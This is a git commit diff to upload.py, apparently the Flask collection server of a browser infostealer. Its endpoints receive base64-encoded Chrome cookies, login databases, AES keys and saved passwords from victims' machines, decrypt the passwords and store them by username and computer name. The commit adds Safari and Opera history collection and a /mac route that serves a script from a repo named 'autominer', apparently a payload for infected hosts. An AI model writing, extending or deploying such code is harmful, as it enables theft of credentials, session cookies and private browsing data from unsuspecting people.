63ba709c0d5c74985b036c82e7b8ca1a9289c86e
zlc1004 <91501777+zlc1004@users.noreply.github.com>
2024-06-04 08:36:08 -0700

    Update upload.py

--- upload.py
+++ upload.py
@@ -2,7 +2,8 @@ import flask
 import time
 import json
 import base64
-import sqlite3,requests
+import sqlite3
+import requests
 import win32crypt  # type: ignore
 from Cryptodome.Cipher import AES
 from datetime import datetime, timedelta
@@ -57,7 +58,7 @@ def decrypt(filename, key):
 
 
 @app.route('/saveHistory', methods=['POST'])
-def saveHistory():
+def saveChromeHistory():
     if request.method == 'POST':
         data = request.form  # a multidict containing POST data
         txt = data['text']
@@ -66,15 +67,15 @@ def saveHistory():
         ComputerName = data['ComputerName']
         txt = txt.split("\n")[0]
         txt = base64.b64decode(txt)
-        filename = "./history/history" + \
+        filename = "ChromeHistory" + \
             str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
-        with open(filename, "wb") as f:
+        with open("./dbs/"+filename+".sqlite", "wb") as f:
             f.write(txt)
-        con = sqlite3.connect(filename)
+        con = sqlite3.connect("./dbs/"+filename+".sqlite")
         cur = con.cursor()
         cur = cur.execute("SELECT * FROM 'urls'")
         # save as json
-        with open(filename+".json", "w") as f:
+        with open("./data/"+filename+".json", "w") as f:
             json.dump(cur.fetchall(), f)
         cur.close()
         con.close()
@@ -91,9 +92,9 @@ def saveLoginData():
         ComputerName = data['ComputerName']
         txt = txt.split("\n")[0]
         txt = base64.b64decode(txt)
-        filename = "./LoginData/LoginData" + \
+        filename = "ChromeLoginData" + \
             str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
-        with open(filename, "wb") as f:
+        with open("./dbs/"+filename+".sqlite", "wb") as f:
             f.write(txt)
         # print(txt)
         return "ok"
@@ -109,12 +110,13 @@ def saveCookie():
         ComputerName = data['ComputerName']
         txt = txt.split("\n")[0]
         txt = base64.b64decode(txt)
-        filename = "./Cookie/Cookie" + \
+        filename = "ChromeCookie" + \
             str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
-        with open(filename, "wb") as f:
+        with open("./dbs/"+filename+".sqlite", "wb") as f:
             f.write(txt)
         # print(txt)
         return "ok"
+
 
 @app.route('/saveAesKey', methods=['POST'])
 def saveAesKey():
@@ -125,11 +127,25 @@ def saveAesKey():
         ComputerName = data['ComputerName']
         key = key.split("\n")[0]
         key = base64.b64decode(key)
-        filename = "./aesKey/aesKey" + \
+        filename = "ChromeAESKey" + \
             str(int(time.time()))+"-"+username+"-"+ComputerName
-        with open(filename+".aeskey", "wb") as f:
+        with open("./aesKey/"+filename+".aeskey", "wb") as f:
             f.write(key)
         # print(txt)
+        return "ok"
+
+@app.route('/saveJson', methods=['POST'])
+def saveJson():
+    if request.method == 'POST':
+        data = request.form  # a multidict containing POST data
+        key = data['data']
+        username = data['username']
+        ComputerName = data['ComputerName']
+        key = base64.b64decode(key)
+        filename = "./Json/"+ \
+            str(int(time.time()))+"-"+username+"-"+ComputerName
+        with open(filename+".json", "wb") as f:
+            f.write(key)
         return "ok"
 
 @app.route('/saveSavedPasswords', methods=['POST'])
@@ -145,16 +161,71 @@ def saveSavedPasswords():
         key = base64.b64decode(key)
         txt = txt.split("\n")[0]
         txt = base64.b64decode(txt)
-        filename = "./LoginData/LoginData" + \
+        filename = "ChromeLoginData" + \
             str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
-        with open(filename, "wb") as f:
+        with open("./dbs/"+filename+".sqlite", "wb") as f:
             f.write(txt)
-        password = decrypt(filename, key)
-        with open(filename+".json", "w") as f:
+        password = decrypt("./dbs/"+filename+".sqlite", key)
+        with open("./data/"+filename+".json", "w") as f:
             json.dump(password, f)
         return "ok"
+
+@app.route('/saveSafariHistory', methods=['POST'])
+def saveSafariHistory():
+    if request.method == 'POST':
+        data = request.form  # a multidict containing POST data
+        txt = data['text']
+        username = data['username']
+        ComputerName = data['ComputerName']
+        txt = txt.split("\n")[0]
+        txt = base64.b64decode(txt)
+        filename = "SafariHistory" + \
+            str(int(time.time()))+username+"-"+ComputerName
+        with open("./dbs/"+filename+".sqlite", "wb") as f:
+            f.write(txt)
+        con = sqlite3.connect("./dbs/"+filename+".sqlite")
+        cur = con.cursor()
+        cur = cur.execute("SELECT * FROM history_items;")
+        # save as json
+        dat=cur.fetchall()
+        dat=[list(map(str, x)) for x in dat]
+        with open("./data/"+filename+".json", "w") as f:
+            json.dump(dat, f,ensure_ascii=False)
+        cur.close()
+        con.close()
+        # print(txt)
+        return "ok"
+
+@app.route('/saveOperaHistory', methods=['POST'])
+def saveOperaHistory():
+    if request.method == 'POST':
+        data = request.form  # a multidict containing POST data
+        txt = data['text']
+        name = data['name']
+        username = data['username']
+        ComputerName = data['ComputerName']
+        txt = txt.split("\n")[0]
+        txt = base64.b64decode(txt)
+        filename = "OperaHistory" + \
+            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
+        with open("./dbs/"+filename+".sqlite", "wb") as f:
+            f.write(txt)
+        con = sqlite3.connect("./dbs/"+filename+".sqlite")
+        cur = con.cursor()
+        cur = cur.execute("SELECT * FROM 'urls'")
+        # save as json
+        with open("./data/"+filename+".json", "w") as f:
+            json.dump(cur.fetchall(), f)
+        cur.close()
+        con.close()
+        return "ok"
+
 @app.route('/get')
 def get():
     return requests.get("https://raw.githubusercontent.com/zlc1004/autominer/main/get").text
+
+@app.route('/mac')
+def mac():
+    return requests.get("https://raw.githubusercontent.com/zlc1004/autominer/main/mac.sh").text
 
 app.run(host='0.0.0.0', port="50000")
